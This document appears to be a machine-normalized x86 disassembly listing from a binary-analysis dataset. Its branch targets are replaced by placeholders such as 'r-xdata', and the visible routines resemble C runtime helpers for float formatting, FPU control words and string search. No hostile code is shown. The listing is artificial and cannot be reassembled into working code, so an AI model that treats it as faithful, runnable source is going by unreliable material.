mov [ ebp - 0x40 ] esi
cmp eax edx
jne r-xdata
cmp eax 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_423cea
add esp 0xc
test eax eax
jne r-xdata
mov edi [ ebp - 0x18 ]
shr edi 0x10
sub edi 0x3ffe
xor eax eax
push 0x8
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x16 ] ax
mov ebx [ ebp - 0x18 ]
pop edi
mov [ ebp - 0x48 ] eax
push 0x15
pop eax
cmp edi eax
jle r-xdata
xor eax eax
mov [ ecx ] ax
mov eax 0x8000
cmp [ ebp - 0x78 ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ecx + 0x2 ] al
xor eax eax
inc eax
mov [ ecx + 0x3 ] al
mov [ ecx + 0x4 ] 0x30
cmp di [ ebp - 0x6c ]
ja r-xdata
mov ecx [ ebp - 0x44 ]
test ecx ecx
jne r-xdata
imul ecx ecx 0xc
add ecx eax
mov eax 0x8000
mov [ ebp - 0x88 ] ecx
cmp [ ecx ] ax
jb r-xdata
push r--data
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41f421
int3
mov [ ebx + 0x3 ] 0x6
mov ecx edx
mov eax esi
shr eax 0x1f
shr ecx 0x1f
add edx edx
add ebx ebx
add esi esi
or ebx ecx
or edx eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x18 ] ebx
dec edi
jne r-xdata
mov edi [ ebp - 0x68 ]
push 0x0
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x40 ] esi
pop ebx
test edi edi
jns r-xdata
cmp di [ ebp - 0x58 ]
ja r-xdata
sar [ ebp - 0x44 ] 0x3
add eax 0x54
mov [ ebp - 0x54 ] eax
and ecx 0x7
je r-xdata
jmp r-xdata
movzx edi [ ecx + 0xa ]
mov eax [ ebp - 0x16 ]
mov [ ebp - 0x64 ] edi
xor [ ebp - 0x64 ] eax
and eax 0x7fff
and edi 0x7fff
mov [ ebp - 0x50 ] eax
add eax edi
mov esi 0x8000
and [ ebp - 0x64 ] esi
mov [ ebp - 0x60 ] edi
movzx edi ax
mov eax [ ebp - 0x50 ]
dec esi
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4c ] edi
cmp ax si
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x88 ] ecx
push r--data
push r--data
jmp r-xdata
mov esi [ ebp - 0x70 ]
mov eax [ ebp - 0x48 ]
lea edi [ esi + 0x4 ]
inc eax
mov ecx edi
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x58 ] eax
test eax eax
jle r-xdata
neg edi
and edi 0xff
jle r-xdata
test cx cx
jne r-xdata
mov [ ebp - 0x18 ] ebx
jmp r-xdata
mov eax [ ebp - 0x18 ]
shr eax 0x10
mov ecx 0x3fff
cmp ax cx
jb r-xdata
xor eax eax
cmp [ ebp - 0x64 ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x60 ] si
mov esi [ ebp - 0x40 ]
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_423cea
add esp 0xc
test eax eax
jne r-xdata
mov al [ ecx - 0x1 ]
sub ecx 0x2
cmp al 0x35
jl r-xdata
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp - 0x40 ]
mov ecx edx
mov eax edi
shr eax 0x1f
add edx edx
or edx eax
mov eax [ ebp - 0x44 ]
shr ecx 0x1f
lea esi [ eax + eax ]
or esi ecx
add edi edi
mov eax edi
mov ecx edx
shr eax 0x1f
add edx edx
shr ecx 0x1f
or edx eax
mov eax [ ebp - 0x3c ]
add edi edi
add esi esi
or esi ecx
lea ecx [ eax + edi ]
mov [ ebp - 0x48 ] ecx
cmp ecx edi
jb r-xdata
mov ebx [ ebp - 0x44 ]
test ax ax
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
mov esi ebx
mov edx ebx
cmp di [ ebp - 0x6c ]
ja r-xdata
xor eax eax
jmp r-xdata
cmp ecx edi
jae r-xdata
jmp r-xdata
lea eax [ edx + 0x1 ]
mov ecx ebx
cmp eax edx
jb r-xdata
cmp ecx eax
jae r-xdata
mov ecx edx
mov eax ebx
shl eax 0x1f
shl ecx 0x1f
shr edx 0x1
shr esi 0x1
shr ebx 0x1
or esi ecx
or edx eax
dec edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] esi
test edi edi
jg r-xdata
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x40 ] esi
xor ebx ebx
mov edx ebx
push 0x5
mov [ ebp - 0x50 ] edx
lea ecx [ ebp - 0xc ]
pop eax
inc edi
test [ ebp - 0x28 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
test edx edx
jne r-xdata
cmp di [ ebp - 0x58 ]
ja r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp ecx edi
jae r-xdata
cmp ecx edi
jae r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edi [ eax + edx ]
cmp edi edx
jb r-xdata
add ecx 0x2
inc edx
dec eax
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x5c ] eax
test eax eax
jg r-xdata
lea edi [ ebp - 0x20 ]
lea eax [ ebp - 0x28 ]
lea edi [ edi + edx * 2 ]
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x58 ] edi
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
test esi esi
jne r-xdata
test ax ax
jne r-xdata
mov [ ebp - 0x18 ] ebx
jmp r-xdata
dec ecx
mov eax [ ebp - 0x70 ]
sub cl al
sub cl 0x3
mov [ eax + 0x3 ] cl
movsx ecx cl
mov [ ecx + eax + 0x4 ] bl
xor eax eax
inc eax
mov ecx [ ebp - 0x70 ]
xor eax eax
mov [ ecx ] ax
mov eax 0x8000
cmp [ ebp - 0x78 ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ecx + 0x2 ] al
xor eax eax
inc eax
mov [ ecx + 0x3 ] al
mov [ edi ] 0x30
jmp r-xdata
cmp [ ecx ] 0x39
jne r-xdata
cmp ecx edi
jae r-xdata
inc esi
test ecx ecx
mov ecx [ ebp - 0x48 ]
mov edx eax
je r-xdata
inc esi
cmp edi eax
jae r-xdata
mov esi eax
test eax eax
jle r-xdata
mov edi [ ebp - 0x4c ]
mov esi [ ebp - 0x8 ]
add edi 0xc002
test di di
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp edi edx
jae r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
mov esi ebx
mov edx ebx
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] edx
mov [ ecx + 0x5 ] bl
jmp r-xdata
mov [ ecx ] 0x30
dec ecx
inc [ ecx ]
inc ecx
inc [ esi ]
mov esi [ ebp - 0x70 ]
mov edi [ ebp - 0x68 ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov edx [ ebp - 0x48 ]
add esi [ ebp - 0x34 ]
add edx edx
mov eax ecx
shr eax 0x1f
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x20 ] edx
lea edx [ edi + edi ]
or edx eax
mov ecx edi
shr ecx 0x1f
lea eax [ esi + esi ]
or eax ecx
mov ecx [ ebp - 0x5c ]
mov [ ebp - 0x18 ] eax
shr eax 0x18
add al 0x30
mov [ ecx ] al
mov eax [ ebp - 0x58 ]
inc ecx
dec eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x15 ] bl
mov [ ebp - 0x58 ] eax
test eax eax
jle r-xdata
mov edx [ ebp - 0x10 ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x44 ] ebx
mov [ ecx - 0x4 ] edi
test eax eax
je r-xdata
mov eax [ ebp - 0x68 ]
push 0x5
mov eax ebx
pop esi
mov [ ebp - 0x80 ] eax
lea edx [ ebp - 0xc ]
mov [ ebp - 0x50 ] esi
inc edi
test [ ecx + 0x8 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
test edx edx
jne r-xdata
mov cx [ ebp - 0x10 ]
mov eax edi
neg eax
movzx eax ax
add edi eax
mov [ ebp - 0x4c ] edi
mov edi [ ebp - 0x7c ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x44 ] ebx
mov edx [ ebp - 0x44 ]
push 0x0
pop ebx
test di di
jle r-xdata
mov eax [ ebp - 0xc ]
mov ecx eax
mov edx ebx
add eax eax
shr edx 0x1f
or eax edx
mov [ ebp - 0xc ] eax
shr ecx 0x1f
add esi esi
mov eax 0xffff
add ebx ebx
or esi ecx
add edi eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] esi
test di di
jg r-xdata
mov edi [ ebp - 0x58 ]
mov eax [ ebp - 0x6c ]
add edi 0x2
sub eax 0x2
dec esi
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x6c ] eax
test esi esi
jg r-xdata
inc [ ecx ]
add edx 0x2
inc eax
dec esi
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x50 ] esi
test esi esi
jg r-xdata
lea esi [ ebp - 0x20 ]
lea eax [ esi + eax * 2 ]
lea esi [ ecx + 0x8 ]
mov ecx [ ebp - 0x60 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x84 ] esi
cmp [ ecx + 0x4 ] ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0xe ]
cmp eax 0xffffffff
jne r-xdata
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov ebx [ ebp - 0xc ]
mov ecx ebx
mov eax esi
shl eax 0x1f
shl ecx 0x1f
shr ebx 0x1
shr edx 0x1
or ebx eax
or edx ecx
shr esi 0x1
dec [ ebp - 0x5c ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] edx
jne r-xdata
inc edi
mov eax 0xffff
add edi eax
test di di
jns r-xdata
test esi esi
js r-xdata
movzx edx [ eax ]
movzx eax [ edi ]
imul edx eax
mov eax [ ecx - 0x4 ]
mov [ ebp - 0x68 ] ebx
lea edi [ eax + edx ]
cmp edi eax
jb r-xdata
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x60 ] esi
test esi esi
jle r-xdata
mov edi [ ebp - 0x4c ]
mov eax [ ebp - 0x8 ]
mov esi [ ebp - 0x10 ]
add edi 0xc002
mov [ ebp - 0x40 ] eax
test di di
jle r-xdata
xor esi esi
inc esi
jmp r-xdata
cmp eax edi
jae r-xdata
cmp [ ecx ] ebx
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc eax
mov [ ebp - 0xe ] eax
mov eax [ ebp - 0xa ]
mov [ ebp - 0xe ] ebx
cmp eax 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
push 0x0
test edi edi
mov edi [ ebp - 0x4c ]
mov [ ebp - 0x8 ] esi
pop ebx
je r-xdata
mov eax 0xffff
add edi eax
test di di
jns r-xdata
test eax eax
js r-xdata
mov [ edx - 0x4 ] eax
test esi esi
je r-xdata
mov esi [ ebp - 0x7c ]
mov eax [ ebp - 0x54 ]
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x54 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] esi
mov edx [ ebp - 0x1c ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x16 ] di
jmp r-xdata
inc eax
mov [ ebp - 0xa ] eax
mov ax [ ebp - 0x6 ]
mov ecx 0xffff
mov [ ebp - 0xa ] ebx
cmp ax cx
jne r-xdata
xor eax eax
mov cx dx
inc eax
or cx ax
mov [ ebp - 0x10 ] cx
mov edx [ ebp - 0x10 ]
jmp r-xdata
mov ax [ ebp - 0x10 ]
mov ebx [ ebp - 0x40 ]
mov eax edi
neg eax
movzx eax ax
add edi eax
xor edx edx
mov [ ebp - 0x4c ] edi
mov edi [ ebp - 0x74 ]
mov [ ebp - 0x50 ] eax
inc edx
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx eax
add eax eax
mov edx esi
shr edx 0x1f
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
shr ecx 0x1f
add eax eax
or eax ecx
mov ecx 0xffff
add esi esi
add edi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x40 ]
mov esi [ ebp - 0x84 ]
add eax 0x2
sub esi 0x2
dec ecx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x84 ] esi
test ecx ecx
jg r-xdata
inc [ edx ]
inc ax
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov eax 0x8000
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
mov eax 0x8000
cmp cx ax
ja r-xdata
mov eax [ ebp - 0xe ]
cmp eax 0xffffffff
jne r-xdata
and esi 0x1ffff
cmp esi 0x18000
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax ebx
shl eax 0x1f
mov [ ebp - 0x40 ] ecx
shr [ ebp - 0x40 ] 0x1
or [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
shl ecx 0x1f
shr esi 0x1
shr ebx 0x1
or esi ecx
dec [ ebp - 0x50 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] esi
jne r-xdata
inc edi
movzx edi [ eax ]
movzx eax [ esi ]
imul edi eax
mov eax [ edx - 0x4 ]
mov [ ebp - 0x7c ] ebx
lea esi [ eax + edi ]
cmp esi eax
mov [ ebp - 0x60 ] esi
mov eax esi
jb r-xdata
mov ecx [ ebp - 0x88 ]
mov esi [ ebp - 0x50 ]
mov eax [ ebp - 0x80 ]
mov esi [ ebp - 0x8 ]
jmp r-xdata
inc eax
mov [ ebp - 0xe ] eax
mov eax [ ebp - 0xa ]
mov [ ebp - 0xe ] ebx
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x40 ]
test [ ebp - 0x10 ] dl
je r-xdata
push 0x0
mov [ ebp - 0x40 ] ebx
test edi edi
mov edi [ ebp - 0x4c ]
pop ebx
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x64 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1a ] ecx
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x16 ] di
jmp r-xdata
inc eax
mov [ ebp - 0xa ] eax
mov ax [ ebp - 0x6 ]
mov edx 0xffff
mov [ ebp - 0xa ] ebx
cmp ax dx
jne r-xdata
mov ax si
or ax dx
mov [ ebp - 0x10 ] ax
mov esi [ ebp - 0x10 ]
jmp r-xdata
mov [ ebp - 0x40 ] esi
mov eax 0x7fff
cmp di ax
jae r-xdata
inc ax
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov [ ebp - 0x6 ] cx
inc edi
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
sub_42f98c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
push ebx
push esi
push edi
mov edi 0x200
test cl 0x8
je r-xdata
mov eax 0x80
test cl 0x4
je r-xdata
or eax edi
test cl 0x2
je r-xdata
or eax 0x400
test cl 0x1
je r-xdata
or eax 0x800
mov esi 0x100
test ecx 0x80000
je r-xdata
or eax 0x1000
mov edx ecx
mov ebx 0x300
and edx ebx
je r-xdata
or eax esi
mov edx 0x3000000
pop edi
and ecx edx
pop esi
pop ebx
cmp ecx 0x1000000
je r-xdata
cmp edx esi
je r-xdata
or eax 0x8040
cmp ecx 0x2000000
je r-xdata
or eax 0x2000
cmp edx edi
je r-xdata
or eax 0x40
pop ebp
retn
cmp ecx edx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp edx ebx
jne r-xdata
pop ebp
retn
or eax 0x8000
pop ebp
retn
or eax 0x6000
jmp r-xdata
sub_42fa35
push ebp
mov ebp esp
sub esp 0xc
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
xor ecx ecx
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
push ebx
push esi
movzx esi ax
mov edx esi
mov ebx 0xc00
push edi
mov edi 0x200
and edx ebx
je r-xdata
or ecx 0x80000
and esi 0x300
je r-xdata
cmp edx 0x400
je r-xdata
or ecx 0x20000
cmp esi edi
jne r-xdata
or ecx 0x100
cmp edx 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov esi edi
not esi
and esi ecx
and eax edi
or esi eax
cmp esi ecx
je r-xdata
or ecx 0x40000
movzx eax ax
mov edx 0x1000
test edx eax
je r-xdata
or ecx 0x10000
jmp r-xdata
or ecx edi
jmp r-xdata
cmp edx ebx
jne r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
push esi
call sub_42fd35
movzx eax ax
pop ecx
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
xor esi esi
test al 0x1
je r-xdata
or ecx 0x300
jmp r-xdata
mov eax esi
and edi 0x308031f
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
xor ecx ecx
test al al
jns r-xdata
test al 0x4
je r-xdata
push 0x10
pop esi
test eax 0x200
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or esi 0x8
test eax 0x400
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or esi 0x4
test eax 0x800
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or esi 0x2
test edx eax
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or esi 0x1
test eax 0x100
je r-xdata
or ecx 0x1
movzx edx ax
mov ecx edx
and ecx ebx
je r-xdata
or esi 0x80000
mov edx eax
mov ebx 0x6000
and edx ebx
je r-xdata
or ecx 0x80000
and edx 0x300
je r-xdata
cmp ecx 0x400
je r-xdata
push 0x40
and eax 0x8040
pop ebx
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or esi 0x20000
cmp edx 0x200
jne r-xdata
or esi 0x100
cmp ecx 0x800
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or esi 0x40000
mov edx 0x1000
test edx eax
je r-xdata
or esi 0x10000
jmp r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov eax ecx
xor eax esi
or ecx esi
test eax 0x8031f
je r-xdata
push eax
call sub_42f98c
push eax
mov [ ebp + 0xc ] eax
call sub_42716a
pop ecx
pop ecx
stmxcsr [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
xor ecx ecx
test al al
jns r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx ebx
jne r-xdata
or esi 0x300
jmp r-xdata
mov eax ecx
jmp r-xdata
or ecx 0x80000000
test eax 0x200
je r-xdata
push 0x10
pop ecx
mov eax edi
and edi [ ebp + 0x8 ]
not eax
and eax ecx
or eax edi
cmp eax ecx
je r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x400
je r-xdata
or ecx 0x8
test eax 0x800
je r-xdata
or ecx 0x4
test eax 0x1000
je r-xdata
or ecx 0x2
test eax 0x100
je r-xdata
or ecx 0x1
mov edx eax
mov edi 0x6000
and edx edi
je r-xdata
or ecx 0x80000
and eax 0x8040
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx edi
jne r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
sub_42fd35
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
test cl 0x8
je r-xdata
inc eax
test cl 0x4
je r-xdata
or eax 0x4
test cl 0x2
je r-xdata
or eax 0x8
test cl 0x1
je r-xdata
or eax 0x10
test ecx 0x80000
je r-xdata
or eax 0x20
push esi
mov edx ecx
mov esi 0x300
push edi
mov edi 0x200
and edx esi
je r-xdata
or eax 0x2
mov edx ecx
and edx 0x30000
je r-xdata
cmp edx 0x100
je r-xdata
or eax esi
cmp edx 0x10000
jne r-xdata
or eax 0x400
cmp edx edi
je r-xdata
pop ebp
retn
or eax 0x1000
pop edi
pop esi
test ecx 0x40000
je r-xdata
or eax edi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp edx esi
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_42fdd0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_42fe31
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
push esi
mov eax 0x404e
push edi
mov [ ebp - 0x4 ] eax
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
cmp [ ebp + 0xc ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
mov ecx edx
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] edx
mov edx [ ebx + 0x8 ]
test edx 0x8000
jne r-xdata
mov edx [ ebx + 0x4 ]
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x1c ]
jae r-xdata
pop edi
pop esi
mov [ ebx + 0xa ] ax
pop ebx
leave
retn
mov edi [ ebx ]
mov esi [ ebx + 0x4 ]
mov ecx [ ebx ]
mov esi edx
mov eax ecx
shr eax 0x10
shl edx 0x10
or edx eax
mov eax [ ebp - 0x4 ]
shr esi 0x10
shl ecx 0x10
add eax 0xfff0
mov [ ebx ] ecx
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] esi
mov edx [ ebp - 0x18 ]
xor eax eax
lea ecx [ esi + edx ]
mov [ ebp - 0xc ] ecx
cmp ecx esi
jb r-xdata
mov eax esi
xor ecx ecx
lea esi [ eax + 0x1 ]
cmp esi eax
jb r-xdata
mov [ ebx ] eax
test ecx ecx
je r-xdata
mov eax edi
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
mov eax [ ebp - 0x4 ]
shr ecx 0x1f
add edx edx
or edx ecx
add eax 0xffff
add edi edi
mov [ ebp - 0x4 ] eax
test edx 0x8000
je r-xdata
mov [ ebx ] edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] edx
xor eax eax
inc eax
cmp ecx edx
jae r-xdata
xor ecx ecx
inc ecx
cmp esi 0x1
jae r-xdata
mov edx [ ebp + 0x10 ]
add edi [ ebp - 0x14 ]
mov esi [ ebp - 0xc ]
and [ ebp - 0x10 ] 0x0
mov eax edx
shr eax 0x1f
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
mov ecx [ ebp + 0x8 ]
add edx edx
mov [ ebx ] edx
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] eax
movsx edi [ ecx ]
mov [ ebp - 0x8 ] esi
lea ecx [ edx + edi ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x1c ] edi
mov [ ebp + 0x10 ] ecx
cmp ecx edx
jb r-xdata
inc edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] ecx
test eax eax
je r-xdata
inc edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] esi
test ecx ecx
je r-xdata
xor edx edx
inc edx
jmp r-xdata
cmp ecx edi
jae r-xdata
mov [ ebx ] ecx
test edx edx
je r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
dec eax
inc [ ebp + 0x8 ]
mov [ ebx + 0x4 ] esi
mov [ ebp + 0xc ] eax
test eax eax
jne r-xdata
lea ecx [ esi + 0x1 ]
xor edx edx
cmp ecx esi
jb r-xdata
mov edx [ ebp + 0x10 ]
mov esi ebx
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov eax ecx
shr eax 0x1f
mov ecx esi
shr ecx 0x1f
add esi esi
or esi eax
add edi edi
or edi ecx
add edx edx
mov eax edx
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
mov eax [ ebp - 0x1c ]
shr ecx 0x1f
add edx edx
add edi edi
or edi ecx
add eax edx
xor ecx ecx
mov [ ebx ] edx
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] edi
mov [ ebp + 0x10 ] eax
cmp eax edx
jb r-xdata
mov eax 0x404e
xor edx edx
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebx + 0x8 ] eax
mov esi ecx
mov [ ebx + 0x4 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] esi
test edx edx
je r-xdata
sub_430020
cmp [ rw-data ] 0x1
jb r-xdata
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
movzx eax [ esp + 0x8 ]
mov edx eax
shl eax 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov edx [ esp + 0x4 ]
mov ecx 0xf
or eax 0xffffffff
and ecx edx
shl eax cl
sub edx ecx
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
bsf eax ecx
add eax edx
movd edx xmm3
xor ecx ecx
cmp dl [ eax ]
cmovne eax ecx
retn
or eax 0xffffffff
add edx 0x10
jmp r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
movdqu xmm1 [ edx ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
por xmm2 xmm1
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_430160
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
